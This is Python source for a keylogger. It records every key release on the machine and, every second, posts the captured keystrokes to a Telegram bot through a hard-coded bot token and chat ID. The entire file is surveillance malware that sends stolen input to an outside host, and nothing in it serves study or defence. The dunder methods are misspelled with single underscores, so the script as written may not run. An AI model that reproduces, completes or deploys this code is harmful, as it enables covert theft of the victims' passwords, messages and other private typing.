import keyboard
import requests
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 1  # in seconds, 60 means 1 minute and so on
BOT_TOKEN = "7051484543:AAGqHyAjg8H1XGKXbhDqyP8VVlhjv6vDWQg"
CHAT_ID = "6963998254"

class Keylogger:
    def _init_(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": CHAT_ID,
            "text": message
        }
        requests.post(url, params=params)

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.send_telegram_message(self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ == "_main_":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()